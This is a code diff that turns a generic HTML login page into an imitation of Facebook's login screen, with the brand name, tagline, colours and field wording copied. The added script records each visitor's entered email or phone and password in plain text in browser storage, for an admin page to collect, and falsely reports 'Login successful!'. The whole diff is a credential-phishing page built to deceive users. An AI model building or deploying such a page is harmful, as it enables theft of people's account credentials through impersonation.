@@ -13,6 +13,7 @@
             height: 100vh;
             margin: 0;
             background-color: #f0f2f5;
+            flex-direction: column;
         }
         .login-box {
             background: white;
@@ -20,11 +21,22 @@
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             width: 300px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 36px;
+            color: #1877f2; /* Facebook blue color */
+            margin-bottom: 10px;
         }
         h2 {
-            text-align: center;
-            color: #1a73e8;
+            font-size: 20px;
             margin-bottom: 20px;
+            color: #1a73e8;
+        }
+        p {
+            color: #606770;
+            font-size: 14px;
+            margin-top: 20px;
         }
         input {
             width: 100%;
@@ -37,7 +49,7 @@
         button {
             width: 100%;
             padding: 10px;
-            background-color: #1a73e8;
+            background-color: #1877f2; /* Facebook blue color */
             color: white;
             border: none;
             border-radius: 4px;
@@ -45,59 +57,40 @@
             margin-top: 10px;
         }
         button:hover {
-            background-color: #1557b0;
+            background-color: #145dbb; /* Slightly darker blue */
         }
     </style>
 </head>
 <body>
+    <h1>Facebook</h1>
+    <p>Connect with friends and the world around you on Facebook.</p>
     <div class="login-box">
         <h2>Login</h2>
         <form id="loginForm">
-            <input type="text" id="userid" placeholder="Enter User ID or Email" required>
-            <input type="password" id="password" placeholder="Enter your Password" required>
+            <input type="text" id="userid" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
     </div>
 
     <script>
-        // Encode data to base64 for URL safety
-        function encodeData(data) {
-            return btoa(JSON.stringify(data));
-        }
-
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const userid = document.getElementById('userid').value;
             const password = document.getElementById('password').value;
             
-            // Get existing data from admin page
-            fetch('admin.html')
-                .then(response => response.text())
-                .then(html => {
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(html, 'text/html');
-                    const dataScript = doc.querySelector('#loginData');
-                    let existingData = [];
-                    if (dataScript) {
-                        try {
-                            existingData = JSON.parse(atob(dataScript.textContent));
-                        } catch(e) {}
-                    }
-                    
-                    // Add new entry
-                    existingData.push({
-                        userid: userid,
-                        password: password,
-                        time: new Date().toLocaleString()
-                    });
-                    
-                    // Store encoded data in localStorage for admin page
-                    localStorage.setItem('encodedData', encodeData(existingData));
-                    
-                    alert('Login successful!');
-                    document.getElementById('loginForm').reset();
-                });
+            let entries = JSON.parse(localStorage.getItem('loginEntries') || '[]');
+            entries.push({
+                userid: userid,
+                password: password,
+                time: new Date().toLocaleString()
+            });
+            
+            localStorage.setItem('loginEntries', JSON.stringify(entries));
+            
+            alert('Login successful!');
+            document.getElementById('loginForm').reset();
         });
     </script>
 </body>
